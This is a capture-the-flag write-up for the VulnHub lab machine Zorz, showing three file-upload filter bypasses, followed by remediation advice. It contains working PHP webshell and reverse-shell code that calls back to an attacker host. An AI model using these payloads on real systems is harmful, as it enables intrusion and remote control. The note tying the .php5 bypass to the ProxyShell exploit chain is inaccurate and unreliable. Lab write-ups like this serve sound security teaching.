# TopHatSec: Zorz — Three Upload Forms, Three Bypasses

Alright dudes!! Zorz is a dedicated file upload security challenge: three progressively harder upload forms, each with different levels of filtering, and your job is to bypass all three and get a shell. No complex recon, no lateral movement — just pure file upload bypass methodology applied at increasing difficulty. This machine is goated for learning exactly what separates a good upload bypass from a script-kiddie attempt. fr fr.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | TopHatSec: Zorz |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tophatsec-zorz,117/ |
| **Techniques** | Nmap service enumeration, dirb directory brute-force, file upload bypass (extension rename, Content-Type manipulation, magic bytes prepend), PHP reverse shell via each challenge level |
| **CVEs** | CWE-434 (Unrestricted Upload of File with Dangerous Type — all three challenge levels), CWE-345 (Insufficient Verification of Data Authenticity — MIME type and extension checks bypass) |
| **APT Groups** | APT41: exploits web application file upload vulnerabilities as a primary initial access vector; FIN7: uses file upload bypass techniques to deploy webshells in targeted web application attacks |

---

## Attack Summary

```
nmap → port 80 (HTTP)
  → dirb: discover /uploader/ and challenge pages
  → Challenge 1: no real filtering → rename shell.php → shell.php (or .php5)
  → Challenge 2: Content-Type filter → change MIME to image/jpeg in request
  → Challenge 3: magic bytes filter → prepend GIF89a; to PHP shell
  → all three → netcat sessions → www-data
```

---

## Methodology

1. Host discovery and port scan
2. dirb to enumerate upload challenge pages
3. Challenge 1: test basic PHP upload (no filtering or extension only)
4. Challenge 2: bypass Content-Type filtering with MIME spoofing
5. Challenge 3: bypass magic bytes check by prepending GIF89a header
6. Collect reverse shells from all three challenges

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.129

nmap -sV -sC 192.168.1.129
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
```

Single HTTP service. The machine is a web-only challenge.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
dirb http://192.168.1.129/ /usr/share/wordlists/dirb/common.txt
```

Discover upload challenge pages:

```
/uploader/
/uploader/upload1.php   (Challenge 1)
/uploader/upload2.php   (Challenge 2)
/uploader/upload3.php   (Challenge 3)
/uploader/uploads/      (where files land)
```

Each challenge is a file upload form with increasing filtering complexity.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Challenge 1: Basic Upload (No Real Filtering)

Challenge 1 has minimal or no server-side validation. Upload a PHP reverse shell directly:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit LHOST and LPORT

# Start listener
nc -lvnp 4444

# Upload shell.php via the form at /uploader/upload1.php
# If .php is blocked, try:
mv shell.php shell.php5
# or: shell.phtml, shell.pHp, shell.PHP, shell.phar
```

After upload, trigger the shell:

```bash
curl http://192.168.1.129/uploader/uploads/shell.php
# or shell.php5 etc.
```

Netcat callback: `www-data`.

**Real-world note:** Many upload forms check only the file extension and trust the filename. Renaming a PHP file to `.php5` or `.phtml` bypasses blacklist-based extension filters on Apache configurations that don't explicitly disallow these extensions. This was the upload bypass in the 2021 Exchange ProxyShell exploitation chain.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1505.003 — Web Shell

---

## Step 4 — Challenge 2: Content-Type / MIME Bypass

Challenge 2 checks the `Content-Type` HTTP header of the uploaded file. The server expects an image MIME type (`image/jpeg`, `image/png`, etc.) but does not verify the actual file content.

Intercept the upload request with Burp Suite and modify the Content-Type header:

**Original request:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

**Modified request:**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

Or with curl:

```bash
curl -F "file=@/tmp/shell.php;type=image/jpeg" \
  http://192.168.1.129/uploader/upload2.php
```

The server accepts the file because Content-Type says it's an image. The actual content is PHP. Trigger:

```bash
curl http://192.168.1.129/uploader/uploads/shell.php
```

**Alternative:** Some implementations check only the extension in the filename. Try uploading with filename `shell.php.jpg` — the server strips the last extension and executes PHP if misconfigured.

**Real-world note:** Content-Type validation is client-controlled: any HTTP client can send any Content-Type header. Server-side validation must check file content, not headers. Numerous CVEs in CMSs (WordPress, Drupal, Joomla) have exploited this exact pattern.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1036 — Masquerading

---

## Step 5 — Challenge 3: Magic Bytes Bypass

Challenge 3 reads the first few bytes of the uploaded file (magic bytes) to verify it's actually an image. PHP file magic bytes are clearly PHP, while JPEG starts with `\xff\xd8\xff` and GIF starts with `GIF89a`.

Prepend the GIF magic bytes to the PHP shell:

```bash
# Method 1: Prepend GIF89a string
echo -n "GIF89a" > /tmp/shell3.php
cat /usr/share/webshells/php/php-reverse-shell.php >> /tmp/shell3.php
# Edit LHOST and LPORT in the file after prepending

# Method 2: Create manually
cat > /tmp/shell3.php << 'EOF'
GIF89a
<?php
$sock = fsockopen("192.168.1.x", 4445, $errno, $errstr, 30);
$proc = proc_open("/bin/sh", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
EOF
```

Upload via the Challenge 3 form. The magic bytes check passes (sees `GIF89a`). Apache still executes it as PHP because of the `.php` extension.

```bash
nc -lvnp 4445
curl http://192.168.1.129/uploader/uploads/shell3.php
```

Netcat callback: `www-data`. Challenge 3 done.

**Real-world note:** Magic bytes validation prevents naive "look at the file extension" attacks but is defeated the moment the file still has a PHP-executable extension. True file validation requires: (1) magic bytes check, (2) extension whitelist, (3) MIME type validation, AND (4) storing uploads OUTSIDE the web root. APT41 specifically uses magic bytes prepending in webshell deployment operations.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1027 — Obfuscated Files or Information

---

## Captured Flags, Hashes and Credentials

| Challenge | Access | Upload Method | Shell As |
|---|---|---|---|
| 1 | /uploader/upload1.php | Direct PHP upload or .php5 rename | www-data |
| 2 | /uploader/upload2.php | Content-Type: image/jpeg spoof | www-data |
| 3 | /uploader/upload3.php | GIF89a magic bytes prepend | www-data |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Extension-only filtering bypassed with .php5/.phtml | Blacklist-based extension filtering is inherently incomplete: always another extension to try | Use extension whitelist (allow only .jpg, .png, .gif etc.); explicitly block all PHP variants in Apache/Nginx config |
| 2 | Content-Type header bypass | Content-Type is client-controlled and cannot be trusted for security decisions | Read actual file content; never trust headers for file type validation |
| 3 | Magic bytes bypass via GIF89a prepend | Checking only magic bytes is insufficient if the file still has a PHP extension | Defense requires layered checks: magic bytes + extension whitelist + MIME validation + store outside web root |
| 4 | All challenges land in /uploads/ inside web root | Even with correct file type validation, executing uploaded content is dangerous if stored in web root | Store all uploads outside the document root; use a separate process to serve static files; never execute uploaded content |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Defense Evasion | Defense Evasion | Masquerading: MIME Type Spoofing | T1036 |
| Defense Evasion | Defense Evasion | Obfuscated Files: Magic Bytes | T1027 |
| Persistence | Persistence | Web Shell | T1505.003 |
| Execution | Execution | Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Validate file content on the server** — check magic bytes AND extension AND MIME type; all three, not one
2. **Whitelist allowed extensions** — only permit `.jpg`, `.png`, `.gif`, `.pdf`, `.docx`; block everything else including `.php`, `.php5`, `.phtml`, `.phar`
3. **Store uploads OUTSIDE the web root** — `/var/uploads/` not `/var/www/html/uploads/`; serve via a controlled endpoint
4. **Disable PHP execution in upload directories** — Apache: `php_admin_value engine Off` in upload directory `.htaccess` or vhost config
5. **Use a Content Delivery Network or object storage for user uploads** — S3, CloudFront, or equivalent removes PHP execution entirely from the upload path
6. **Rename uploaded files server-side** — use UUID filenames; strip original extension; prevents direct triggering by knowing the upload path

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all file upload endpoints in web applications |
| Protect | Access Control | Store uploads outside web root; disable PHP in upload dirs |
| Protect | Data Security | Content validation: magic bytes + extension whitelist + MIME |
| Detect | Anomalies and Events | Alert on PHP file uploads; webshell detection rules (Suricata/ModSecurity) |
| Respond | Response Planning | Remove all uploaded webshells; audit upload logs for exploitation evidence |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Validate file content on server-side: magic bytes, extension, MIME |
| CM-7 | Least Functionality | Disable PHP execution in upload directories; whitelist file types |
| SC-28 | Protection of Information at Rest | Store uploads outside web root; use UUID filenames |
| AU-12 | Audit Record Generation | Log all file upload events; alert on PHP or script file uploads |

### CISA KEV

Unrestricted file upload (CWE-434) is consistently in the top exploited web vulnerability classes per CISA. CISA Alert AA21-131A specifically addresses webshell deployment via file upload as a top threat actor technique. Organizations should treat any web application file upload as a potential RCE vector requiring defense-in-depth controls.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Configurations | MIL2 |
| Situational Awareness (SITUATION) | Perform Logging | MIL3 |

### MITRE D3FEND

- **D3-FV** — File Validation (content validation: magic bytes + extension + MIME on server-side)
- **D3-ACH** — Application Configuration Hardening (PHP disabled in upload dirs; store outside web root)
- **D3-OAM** — Operating System Administrative Management (file system permissions restricting upload execution)

---

## Final Thoughts

Zorz is the file upload security course you didn't know you needed. Three challenges, three techniques, three lessons: extension bypass, Content-Type bypass, magic bytes bypass. Each one builds on the last, and together they show exactly why file upload validation requires defense-in-depth, not a single check.

The real takeaway: there is no single check that stops all file upload attacks. The only reliable defense is storing uploads outside the web root and serving them through a controlled, non-executing endpoint. Everything else is a layer you can add for defense-in-depth, not a complete solution.

Thanks guys!! (❍ᴥ❍ʋ)
